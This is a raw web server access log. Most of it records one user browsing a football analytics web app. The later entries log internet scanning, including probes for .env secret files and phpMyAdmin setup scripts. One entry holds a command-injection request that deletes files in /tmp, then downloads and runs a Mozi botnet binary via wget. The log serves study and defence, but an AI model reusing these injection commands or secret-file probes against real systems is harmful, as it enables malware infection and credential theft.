66.188.190.72 - - [10/Sep/2022:21:24:31 +0000] "GET /static/spatial/EndzoneSouth.jpg HTTP/1.1" 304 275 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:24:31 +0000] "GET /endzone/rest/getformation HTTP/1.1" 200 429 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:24:31 +0000] "GET /endzone/rest/getdata?teamcode=EVHS22&team=Burnsville&opponent=Farmington&year=2021&full=false HTTP/1.1" 200 51641 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:24:31 +0000] "GET /static/spatial/Pressure.jpg HTTP/1.1" 304 270 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:24:37 +0000] "GET /Endzone/Formations HTTP/1.1" 200 1865 "http://172.104.25.168/Endzone/Game" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:24:37 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1397 "http://172.104.25.168/Endzone/Formations" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:24:37 +0000] "GET /static/css/Formations.css HTTP/1.1" 200 1010 "http://172.104.25.168/Endzone/Formations" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:24:37 +0000] "GET /static/css/Table.css HTTP/1.1" 200 1066 "http://172.104.25.168/Endzone/Formations" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:24:37 +0000] "GET /static/js/Formation.js HTTP/1.1" 200 1075 "http://172.104.25.168/Endzone/Formations" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:24:37 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/Formations" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:26:16 +0000] "GET /Endzone/KIPP HTTP/1.1" 200 1836 "http://172.104.25.168/Endzone/Formations" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:26:16 +0000] "GET /static/css/KIPP.css HTTP/1.1" 200 1088 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:26:16 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1398 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:26:16 +0000] "GET /static/js/KIPP.js HTTP/1.1" 200 704 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:26:16 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:26:16 +0000] "GET /static/images/KIPP_Background.jpg HTTP/1.1" 200 2078976 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:26:51 +0000] "POST /Endzone/KIPP/Run HTTP/1.1" 200 300399 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:27:43 +0000] "-" 408 0 "-" "-"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /Endzone/DAT HTTP/1.1" 200 3348 "http://172.104.25.168/Endzone/KIPP" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1397 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/css/DAT.css HTTP/1.1" 200 1556 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/css/Filterbar.css HTTP/1.1" 200 775 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/leaflet_draw/leaflet.draw.css HTTP/1.1" 200 1683 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/leaflet_draw/leaflet.draw-src.css HTTP/1.1" 200 1836 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/js/DAT.js HTTP/1.1" 200 4411 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/leaflet_draw/leaflet.draw.js HTTP/1.1" 200 14819 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/leaflet_draw/leaflet.draw-src.js HTTP/1.1" 200 27133 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/spatial/FootballFieldBase.jpg HTTP/1.1" 304 280 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/spatial/EndzoneNorth.jpg HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/leaflet_draw/images/spritesheet.svg HTTP/1.1" 304 272 "http://172.104.25.168/static/leaflet_draw/leaflet.draw-src.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /static/spatial/EndzoneSouth.jpg HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /Endzone/DAT/GetParam?team=&opponent=%20&year=2022&possession=%20&_=1662845758017 HTTP/1.1" 200 309 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:35:55 +0000] "GET /Endzone/DAT/GetData?team=&opponent=%20&year=2022&drive=&_=1662845758018 HTTP/1.1" 200 216 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
90.151.171.106 - - [10/Sep/2022:21:37:33 +0000] "CONNECT check.best-proxies.ru:443 HTTP/1.1" 405 345 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [10/Sep/2022:21:37:43 +0000] "GET http://check.best-proxies.ru/ip.php?Z74643052982Q1 HTTP/1.1" 404 382 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
66.188.190.72 - - [10/Sep/2022:21:37:48 +0000] "GET /Endzone/DAT/GetParam?team=Eastview&opponent=LN&year=2022&possession=LN&_=1662845758019 HTTP/1.1" 200 341 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:37:48 +0000] "GET /Endzone/DAT/GetData?team=Eastview&opponent=LN&year=2022&drive=3&_=1662845758020 HTTP/1.1" 200 7375 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:38:06 +0000] "GET /Endzone/DAT/GetParam?team=Eastview&opponent=Woodbury&year=2022&possession=Woodbury&_=1662845758021 HTTP/1.1" 200 324 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:38:06 +0000] "GET /Endzone/DAT/GetData?team=Eastview&opponent=Woodbury&year=2022&drive=1&_=1662845758022 HTTP/1.1" 200 3856 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:38:10 +0000] "GET /Endzone/DAT/GetData?team=Eastview&opponent=Woodbury&year=2022&drive=9&_=1662845758023 HTTP/1.1" 200 3831 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:39:09 +0000] "GET /Endzone/DAT/GetData?team=Eastview&opponent=Woodbury&year=2022&drive=11&_=1662845758024 HTTP/1.1" 200 2025 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:39:11 +0000] "GET /Endzone/DAT/GetData?team=Eastview&opponent=Woodbury&year=2022&drive=4&_=1662845758025 HTTP/1.1" 200 2033 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:39:30 +0000] "GET /Endzone/TARS HTTP/1.1" 200 2394 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:39:30 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1397 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:39:30 +0000] "GET /static/css/TARS.css HTTP/1.1" 200 1325 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:39:30 +0000] "GET /static/js/TARS.js HTTP/1.1" 200 826 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:39:30 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:39:44 +0000] "GET /Endzone/TARS/Run?down=1&distance=No%20Filter&yard=No%20Filter&hash=No%20Filter&games=&possession=Park HTTP/1.1" 200 406 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:40:08 +0000] "GET /Endzone/TARS/Run?down=1&distance=No%20Filter&yard=Midfield&hash=No%20Filter&games=&possession=Park HTTP/1.1" 200 403 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:40:30 +0000] "GET /Endzone/TARS/Run?down=2&distance=Short&yard=No%20Filter&hash=No%20Filter&games=&possession=Park HTTP/1.1" 200 397 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:40:37 +0000] "GET /Endzone/TARS/Run?down=2&distance=Medium&yard=No%20Filter&hash=No%20Filter&games=&possession=Park HTTP/1.1" 200 391 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:40:43 +0000] "GET /Endzone/TARS/Run?down=2&distance=Long&yard=No%20Filter&hash=No%20Filter&games=&possession=Park HTTP/1.1" 200 390 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:37 +0000] "GET /Endzone/CASE HTTP/1.1" 200 782 "http://172.104.25.168/Endzone/TARS" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:37 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1397 "http://172.104.25.168/Endzone/CASE" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:37 +0000] "GET /static/css/TARS.css HTTP/1.1" 200 1325 "http://172.104.25.168/Endzone/CASE" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:37 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 275 "http://172.104.25.168/Endzone/CASE" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /Endzone/DAT HTTP/1.1" 200 3347 "http://172.104.25.168/Endzone/CASE" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/css/Filterbar.css HTTP/1.1" 200 774 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1397 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/css/DAT.css HTTP/1.1" 200 1555 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/js/DAT.js HTTP/1.1" 200 4411 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/leaflet_draw/leaflet.draw.css HTTP/1.1" 200 1683 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/leaflet_draw/leaflet.draw-src.css HTTP/1.1" 200 1836 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/leaflet_draw/leaflet.draw.js HTTP/1.1" 200 14819 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/leaflet_draw/leaflet.draw-src.js HTTP/1.1" 200 27133 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/leaflet_draw/images/spritesheet.svg HTTP/1.1" 304 272 "http://172.104.25.168/static/leaflet_draw/leaflet.draw-src.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/spatial/EndzoneNorth.jpg HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/spatial/FootballFieldBase.jpg HTTP/1.1" 304 280 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /static/spatial/EndzoneSouth.jpg HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /Endzone/DAT/GetParam?team=&opponent=%20&year=2022&possession=%20&_=1662846102144 HTTP/1.1" 200 309 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:39 +0000] "GET /Endzone/DAT/GetData?team=&opponent=%20&year=2022&drive=&_=1662846102145 HTTP/1.1" 200 216 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:40 +0000] "GET /Logout HTTP/1.1" 302 499 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:40 +0000] "GET / HTTP/1.1" 200 996 "http://172.104.25.168/Endzone/DAT" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:40 +0000] "GET /static/images/HomeBackground.jpg HTTP/1.1" 304 278 "http://172.104.25.168/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:40 +0000] "GET /static/css/Home.css HTTP/1.1" 200 1233 "http://172.104.25.168/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:40 +0000] "GET /static/images/HomeBackground_Iphone.jpg HTTP/1.1" 304 286 "http://172.104.25.168/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:40 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 274 "http://172.104.25.168/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [10/Sep/2022:21:41:40 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1397 "http://172.104.25.168/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
185.254.196.223 - - [10/Sep/2022:23:12:58 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [10/Sep/2022:23:12:58 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
80.94.92.239 - - [10/Sep/2022:23:32:19 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.52 - - [10/Sep/2022:23:35:25 +0000] "GET / HTTP/1.0" 200 2578 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
152.89.196.211 - - [10/Sep/2022:23:55:42 +0000] "GET /console/ HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.94.92.231 - - [10/Sep/2022:23:57:00 +0000] "GET / HTTP/1.1" 200 2559 "-" "-"
192.241.220.166 - - [11/Sep/2022:00:16:47 +0000] "GET /actuator/health HTTP/1.1" 404 363 "-" "Mozilla/5.0 zgrab/0.x"
192.241.206.169 - - [11/Sep/2022:00:23:47 +0000] "GET /portal/redlion HTTP/1.1" 404 363 "-" "Mozilla/5.0 zgrab/0.x"
20.25.85.8 - - [11/Sep/2022:00:35:12 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.25.85.8 - - [11/Sep/2022:00:35:12 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.0.77.75 - - [11/Sep/2022:00:45:19 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
20.0.77.75 - - [11/Sep/2022:00:45:19 +0000] "GET /xmlrpc.php HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
195.178.120.159 - - [11/Sep/2022:00:48:21 +0000] "GET / HTTP/1.1" 200 960 "http://172.104.25.168:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
220.198.241.32 - - [11/Sep/2022:00:58:52 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 419 "-" "Hello, world"
88.212.1.22 - - [11/Sep/2022:01:02:26 +0000] "GET / HTTP/1.1" 200 2559 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
43.143.58.236 - - [11/Sep/2022:01:05:56 +0000] "GET http://172.104.25.168:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
43.143.58.236 - - [11/Sep/2022:01:05:56 +0000] "GET http://172.104.25.168:80/db/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
43.143.58.236 - - [11/Sep/2022:01:05:56 +0000] "GET http://172.104.25.168:80/mysql/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
43.143.58.236 - - [11/Sep/2022:01:05:59 +0000] "GET http://172.104.25.168:80/pma/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
